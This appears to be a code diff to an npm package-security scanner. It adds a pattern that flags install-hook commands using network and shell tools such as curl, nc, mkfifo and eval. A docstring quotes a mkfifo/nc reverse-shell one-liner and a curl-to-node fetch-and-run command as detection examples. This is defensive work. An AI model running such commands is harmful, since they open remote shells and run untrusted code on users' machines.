@@ -35,6 +35,14 @@ Bounded at every repeat. A command reaches here decoded from the manifest's JSON
 quote is a literal one and a quoted program ends at the first matching quote."""
 
 
+SHELL_WORK = re.compile(
+    r"\b(?:curl|wget|nc|ncat|netcat|socat|telnet|mkfifo|base64|openssl|eval|powershell|pwsh|"
+    r"iwr|Invoke-WebRequest|Invoke-Expression|iex)\b|/dev/(?:tcp|udp)/|\|"
+)
+"""A hook command doing shell work of its own: fetching, opening a socket, decoding, evaluating,
+or piping one program into another. A command that only names a build tool or a file does not."""
+
+
 class InlineProgram(NamedTuple):
     path: str
     """Where the program is read: the manifest's path, `#`, the hook, its index, a suffix."""
@@ -66,6 +74,34 @@ class InlinePrograms:
                 )
             )
         return found
+
+    @staticmethod
+    def shell(manifest_path: str, hook_name: str, command: str) -> InlineProgram | None:
+        """The hook's command itself, as the shell program it is, when it does shell work.
+
+        `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <host> <port> >/tmp/f` and
+        `curl -s <url> | node --input-type=module` are whole programs written in the manifest;
+        a word list read them and the shell rules never did (review 98: both only raised
+        "has an install script"). Lifted as `package.json#postinstall.sh`, every content detector
+        reads them as install-time shell, as it reads a hook's `.sh` file.
+        """
+        if not command or not SHELL_WORK.search(command):
+            return None
+        return InlineProgram(
+            path=f"{manifest_path}#{hook_name}.sh",
+            source=command,
+            span=(0, len(command)),
+            interpreter="sh",
+        )
+
+    @staticmethod
+    def lifted(manifest_path: str, hook_name: str, command: str) -> list[InlineProgram]:
+        """Everything a hook's command is lifted into: its inline programs, and the command."""
+        whole = InlinePrograms.shell(manifest_path, hook_name, command)
+        return [
+            *InlinePrograms.found(manifest_path, hook_name, command),
+            *([whole] if whole else []),
+        ]
 
     @staticmethod
     def as_file_command(command: str, programs: list[InlineProgram]) -> str:
